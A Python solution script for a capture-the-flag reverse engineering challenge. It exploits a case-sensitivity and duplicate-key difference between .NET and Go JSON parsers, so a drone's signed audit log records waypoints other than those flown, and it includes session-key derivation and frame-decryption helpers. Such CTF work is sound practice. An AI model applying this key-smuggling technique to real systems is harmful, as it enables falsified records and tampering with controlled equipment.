#!/usr/bin/env python3
"""Split Horizon - CSCTF 2026 reverse engineering (medium).

Exploits the JSON key-matching differential between the Vireo drone client
(.NET System.Text.Json, case-sensitive) and the Go ground command server
(encoding/json, case-insensitive, last duplicate wins) to make the signed
audit trail record different waypoint coordinates than the aircraft flew.
NOTE: the CTF instance is retired; this PoC documents the exploit path.
Usage: split_horizon.py --demo [--frame FRAME_JSON --manifest manifest.json]
       split_horizon.py --derive CLIENT_NONCE_HEX SERVER_NONCE_HEX MASK_A_HEX MASK_B_HEX
       split_horizon.py --decrypt KEY_HEX FRAME_CIPHERTEXT_HEX
Masks are embedded in vireo-ctl.dll and are target-specific; supply them.
"""

import argparse
import hashlib
import hmac
import json
import sys

# Sequence 5 frame as recovered from stream 1 (writeup, step 2). Embedded as
# the concrete demonstration payload; not secret.
DEMO_FRAME = ('{"mission_id":"AV-C66D4E","seq":5,"params":{"altitude":4500,'
              '"speed":200,"waypoint_lat":45.9702,"waypoint_lon":23.5830,'
              '"payload_weight":2.5,"wind_compensation":0.0,'
              '"WAYPOINT_LAT":45.9720,"WAYPOINT_LON":23.5783}}')


def derive_session_key(client_nonce, server_nonce, mask_a, mask_b):
    """Session key = first 16 bytes of HMAC-SHA256(clientNonce||serverNonce,
    keyed by MaskA XOR MaskB)."""
    if len(mask_a) != len(mask_b):
        raise ValueError("masks must be the same length")
    ikm = bytes(a ^ b for a, b in zip(mask_a, mask_b))
    return hmac.new(ikm, client_nonce + server_nonce, hashlib.sha256).digest()[:16]


def xor_stream(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def extract_json_objects(stream):
    """Brace-matching scan for top-level JSON objects in a decrypted stream."""
    objs, depth, start, in_str, esc = [], 0, None, False, False
    for i, ch in enumerate(stream):
        if in_str:
            esc = ch == "\\" and not esc
            if ch == '"' and not esc:
                in_str = False
            elif ch != "\\":
                esc = False
            continue
        if ch == '"':
            in_str = True
        elif ch == "{":
            if depth == 0:
                start = i
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0 and start is not None:
                objs.append(stream[start:i + 1])
    return objs


def dotnet_parse(frame_json):
    """[JsonPropertyName] + default case-sensitive System.Text.Json: only the
    exact lowercase keys bind; uppercase duplicates are ignored."""
    params = json.loads(frame_json)["params"]
    return params.get("waypoint_lat"), params.get("waypoint_lon")


def go_parse(frame_json):
    """encoding/json: case-insensitive key match, later duplicate wins."""
    params = json.loads(frame_json)["params"]
    merged = {}
    for k, v in params.items():
        merged[k.lower()] = v  # dict preserves order; last write wins
    return merged.get("waypoint_lat"), merged.get("waypoint_lon")


def within_tolerance(lat, lon, manifest):
    ap_lat = manifest.get("approved_waypoint_lat", manifest.get("approved_lat"))
    ap_lon = manifest.get("approved_waypoint_lon", manifest.get("approved_lon"))
    tol = manifest.get("server_validation_tolerance_deg",
                       manifest.get("tolerance_deg", 0.001))
    return abs(lat - ap_lat) <= tol and abs(lon - ap_lon) <= tol


def demo(frame_json, manifest_path=None):
    frame = json.loads(frame_json)
    drone_lat, drone_lon = dotnet_parse(frame_json)
    srv_lat, srv_lon = go_parse(frame_json)
    print(f"seq {frame.get('seq')} (mission {frame.get('mission_id')})")
    print(f"drone flew (case-sensitive): {drone_lat}, {drone_lon}")
    print(f"server recorded (last wins): {srv_lat}, {srv_lon}")
    if manifest_path:
        manifest = json.load(open(manifest_path))
        ap_lat = manifest.get("approved_waypoint_lat")
        ap_lon = manifest.get("approved_waypoint_lon")
        tol = manifest.get("server_validation_tolerance_deg")
        print(f"approved waypoint: {ap_lat}, {ap_lon} (tolerance {tol})")
        print("server verdict within tolerance:", within_tolerance(srv_lat, srv_lon, manifest))
    print("differential fields: waypoint_lat, waypoint_lon")
    print("mechanism: case_insensitive_last_wins_vs_case_sensitive_exact")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--demo", action="store_true", help="show the seq-5 differential")
    ap.add_argument("--frame", help="frame JSON file (default: embedded seq-5 frame)")
    ap.add_argument("--manifest", help="manifest.json with approved waypoint/tolerance")
    ap.add_argument("--derive", nargs=4, metavar=("CLIENT_NONCE", "SERVER_NONCE", "MASK_A", "MASK_B"),
                    help="derive session key from hex inputs")
    ap.add_argument("--decrypt", nargs=2, metavar=("KEY_HEX", "CIPHERTEXT_HEX"),
                    help="XOR-decrypt a frame with a derived session key")
    args = ap.parse_args()

    if args.derive:
        key = derive_session_key(*[bytes.fromhex(x) for x in args.derive])
        print("session key:", key.hex())
        return 0
    if args.decrypt:
        key = bytes.fromhex(args.decrypt[0])
        pt = xor_stream(bytes.fromhex(args.decrypt[1]), key)
        for obj in extract_json_objects(pt.decode("utf-8", "replace")):
            print(obj)
        return 0
    frame_json = open(args.frame).read() if args.frame else DEMO_FRAME
    demo(frame_json, args.manifest)
    return 0


if __name__ == "__main__":
    sys.exit(main())
